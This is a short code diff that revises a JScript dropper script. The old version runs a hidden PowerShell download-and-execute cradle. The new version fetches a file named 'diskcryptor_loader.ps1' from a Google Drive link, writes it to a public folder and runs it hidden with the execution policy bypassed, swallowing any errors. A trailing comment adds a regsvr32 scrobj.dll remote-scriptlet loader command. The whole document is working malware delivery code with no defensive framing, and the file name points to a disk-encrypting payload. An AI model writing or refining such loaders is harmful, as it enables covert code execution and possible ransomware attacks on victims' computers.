@@ -1,5 +1,26 @@
+
 <script language="JScript">
+    // Change 'XXXX' to your actual Google Drive file ID
     var url = "https://drive.google.com/uc?export=download&id=XXXX";
-    var shell = new ActiveXObject("WScript.Shell");
-    shell.Run("powershell -w hidden -c IEX ((New-Object Net.WebClient).DownloadString('" + url + "'))", 0);
+    var tempPath = "C:\\Users\\Public\\Documents\\diskcryptor_loader.ps1";
+    try {
+        var xmlHttp = new ActiveXObject("MSXML2.XMLHTTP");
+        xmlHttp.open("GET", url, false);
+        xmlHttp.send();
+        if (xmlHttp.status == 200) {
+            var adoStream = new ActiveXObject("ADODB.Stream");
+            adoStream.Type = 1; // Binary
+            adoStream.Open();
+            adoStream.Write(xmlHttp.responseBody);
+            adoStream.SaveToFile(tempPath, 2); // Overwrite if exists
+            adoStream.Close();
+            var shell = new ActiveXObject("WScript.Shell");
+            shell.Run('powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "' + tempPath + '"', 0, false);
+        }
+    } catch (e) {
+        // Optional: handle error
+    }
 </script>
+
+
+// regsvr32.exe /s /n /u /i:"https://your-server/regsvr32_loader.sct" scrobj.dll
